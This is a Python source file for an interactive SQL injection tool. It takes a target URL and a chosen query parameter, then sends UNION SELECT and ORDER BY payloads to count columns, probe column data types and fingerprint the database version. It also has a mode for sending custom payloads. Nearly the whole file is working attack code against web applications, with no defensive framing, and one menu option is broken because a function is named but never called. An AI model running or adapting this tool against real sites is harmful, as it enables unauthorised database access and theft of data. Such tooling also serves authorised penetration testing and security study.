import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

full_url = input("enter url:")
session = requests.Session()



parse = urlparse(full_url)
    # print(parsed.scheme)    https
    # print(parsed.netloc)    example.com
    # print(parsed.path)      /post
    # print(parsed.query)     postId=3

# base_url = f"{parse.scheme}://{parse.netloc}"
# path = parse.path + ("?" + parse.query if parse.query else "")
# submit_url = base_url + path
query_params = parse_qs(parse.query)

print("\n parameters found :")
for i, key in enumerate(query_params.keys()):
    print(f"{i+1}, {key} = {query_params[key]}")

choice = int(input("\nselect param number:"))-1
edit_param = list(query_params.keys())[choice]

result_ord = {}

def column_counter():
    col_count_test = int(input("do u want column-count testing? 1(yes) 0(no) :"))
    if col_count_test:
        max_c = int(input("enter the colums number:"))
        comment_style = ['--', '#']
        for comment in comment_style:
            for quoted in [True, False]:
                print("\n ==== testing with "+ ("quotes" if quoted else 'out quotes')+ "====")
                print(f"\ntesting by ORDER BY ({comment}):\n")
                for i in range(1,max_c+1):
                    if quoted:
                        test_value = f"' ORDER BY {i}{comment}"
                    else:
                        test_value = f"ORDER BY {i}{comment}"
                    test_params = query_params.copy()
                    test_params[edit_param] = [test_value]
                    new_query = urlencode(test_params,doseq=True)
                    new_url = urlunparse(parse._replace(query=new_query))
                    print(f"[{i}] tessting: {new_query}")
                    res = session.get(new_url)
                    result_ord[new_query] = len(res.text)
                    print(f"status code: {res.status_code}")
                # print(result_ord)
                all_len = list(result_ord.values())
                print(all_len)

                result_null = {}
                print(f"\ntessting by NULL ({comment}):\n")

                for i in range(1, max_c+1):
                    nulls = ",".join(["NULL"]*i)
                    if quoted:
                        test_value = f"' UNION SELECT {nulls}{comment}"
                    else:
                        test_value = f" UNION SELECT {nulls}{comment}"
                    test_params = query_params.copy()
                    test_params[edit_param] = [test_value]
                    new_query = urlencode(test_params,doseq=True)
                    new_url = urlunparse(parse._replace(query=new_query))
                    print(f"[{i}] testing: {new_query}")
                    res = requests.get(new_url)
                    result_null[new_query] = len(res.text)
                    print(f"status: {res.status_code}")
                # print(result_null)
                all_len = list(result_null.values())
                print(all_len)
    else:
        pass


print("\n=========")

tests = {
    "string":"'dmDyCT'",
    "int": "123",
    "float": "3.14",
    "bool": "TRUE",
    "time": "2024-01-01",
    "null": "NULL"
}

versions = {
    "Microsoft or MySQL": "@@version",
    "PostgreSQL": "version()",
    "Oracle (v$version)": "banner FROM v$version",
    "Oracle (v$instance)": "version FROM v$instance"
}



def datatype_tester():
    dbtype_test = int(input("do u want data-type testing 1(yes) 0(no) :"))
    if dbtype_test:
        col_count = int(input("enter the number of col:"))
        quote_need = int(input("does it need quote? 1(yes) 0(no):"))
        print("\n [+] testing...")
        comment_style = ['--', '#']
        for comment in comment_style:
            for dtype, payload in tests.items():
                print(f"\n[testing : {dtype}]")

                for i in range(col_count):
                    col = ["NULL"] * col_count
                    col[i] = payload
                    if quote_need:
                        inject = f"' UNION SELECT {','.join(col)}{comment}"
                    else: 
                        inject = f"UNION SELECT {','.join(col)}{comment}"
                    test_params = query_params.copy()
                    test_params[edit_param] = [inject]
                    new_query = urlencode(test_params,doseq=True)
                    new_url = urlunparse(parse._replace(query=new_query))

                    try:
                        res = session.get(new_url)
                        print(f"[col {i+1}] payload : {inject} | status : {res.status_code} | lenght : {len(res.text)}")
                    except Exception as e:
                        print(f"[col {i+1}] error: {e}")
    else:
        pass

def attack():
    while True:
        self_payload = input("enter your payload:")
        test_params = query_params.copy()
        test_params[edit_param] = [self_payload]
        self_query = urlencode(test_params,doseq=True)
        self_url = urlunparse(parse._replace(query=self_query))
        try:    
            res = session.get(self_url)
            print(res.text[:500])
            print("\nstatus code :",res.status_code)
            break
        except Exception as e:
            print("pls try again")


def version():
    col_count = int(input("enter the number of col:"))
    quote_need = int(input("does it need quote? 1(yes) 0(no):"))

    while True:
        try:
            target_col = int(input(f"which column (1–{col_count}) should hold the version payload? \n"))
            if 1 <= target_col <= col_count:
                break
            else:
                print("❌ Invalid column number. Please enter a number within range.")
        except ValueError:
            print("❌ Please enter a valid number.")
    comment_style = ['--', '#']
    for comment in comment_style:
        for dbtype, version_query in versions.items():
            col = ["NULL"] * col_count
            col[target_col - 1] = version_query
            if quote_need:
                payload = f"' UNION SELECT {','.join(col)}{comment} "
            else:
                payload = f"UNION SELECT {','.join(col)}{comment} "
            test_params = query_params.copy()
            test_params[edit_param] = [payload]
            new_query = urlencode(test_params, doseq=True)
            new_url = urlunparse(parse._replace(query=new_query))
            print(f"{dbtype} -> {payload}")
            try:
                res = session.get(new_url)
                print("response len:", len(res.text))
                print("status code:", res.status_code)

                if "MySQL" in res.text or "mysql" in res.text:
                    if res.status_code == 200:
                        print("[+] Target is likely using MySQL\n")
                    else:
                        print("[-]Failed\n")
                elif "PostgreSQL" in res.text:
                    if res.status_code == 200:
                        print("[+] Target is likely using PostgreSQL\n")
                    else:
                        print("[-]Failed\n")
                elif "Oracle" in res.text:
                    if res.status_code == 200:
                        print("[+] Target is likely using Oracle\n")
                    else:
                        print("[-]Failed\n")
                else:
                    print(f"\n===========\n{res.text}\n==========\n")

            except Exception as e:
                print(e)


while True:
    try:
        command = int(input("""enter command:
            1 : Attack
            2 : Find Version
            3 : Column Tester (with -- and # and ')
            4 : Data-type Tester
            0 : Exit
            >>>"""))

        match command:
            case 1:
                attack()
            case 2:
                version()
            case 3:
                column_counter()
            case 4:
                datatype_tester
            case 0:
                break 
    except Exception as e:
        print("ERROR:", e)
        print("enter valid number:")

